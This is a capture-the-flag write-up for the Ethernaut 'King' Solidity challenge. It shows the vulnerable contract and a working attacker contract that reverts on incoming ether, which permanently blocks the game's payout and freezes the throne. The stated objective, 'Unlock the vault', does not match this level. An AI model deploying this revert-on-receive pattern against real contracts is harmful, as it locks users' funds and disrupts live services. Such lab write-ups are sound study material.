# Ethernaut: 9. King

> The contract below represents a very simple game: whoever sends it an amount of ether that is larger than the current prize becomes the new king. On such an event, the overthrown king gets paid the new prize, making a bit of ether in the process! As ponzi as it gets xD
>
> Such a fun game. Your goal is to break it.

**Objective of CTF:**

- Unlock the vault.

**Target contract:**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract King {

  address payable king;
  uint public prize;
  address payable public owner;

  constructor() public payable {
    owner = msg.sender;
    king = msg.sender;
    prize = msg.value;
  }

  receive() external payable {
    require(msg.value >= prize || msg.sender == owner);
    king.transfer(msg.value);
    king = msg.sender;
    prize = msg.value;
  }

  function _king() public view returns (address payable) {
    return king;
  }
}
```

The ponzi starts with 0.001 ether. We can exploit the game by giving an greater or equal ether, but via a contract that disallows receiving ether. This way, if someone is eligible to be the new king, the transaction will fail when it tries to send us the prize!

```solidity
contract KingAttacker {
  error ImTheKing();

  receive() external payable {
    revert ImTheKing();
  }

  fallback() external payable {
    revert ImTheKing();
  }

  function pwn(address payable _to) public payable {
    (bool sent, ) = _to.call{value: msg.value}("");
    require(sent, "pwnage failed");
  }
}
```

The contract is simple: a forward function forwards our sent money to some address. The recieving address will know the contract as `msg.sender`, however they won't be able to send money back. Preventing to recieving money can be done by **not** implementing `receive` and `fallback` functions. In my case, I wanted to be a little bit cheeky and I implement them but inside revert with "Im the king!" message when they send me money ;)

**A note on Call vs. Transfer**: We used `_to.call{value: msg.value}("")` instead of `_to.transfer(msg.value)`. This is because `transfer` sends 2300 gas to the receiver, but that gas may not always be enough for the code to run on their side; so we must forward all our gas to them with `call`.
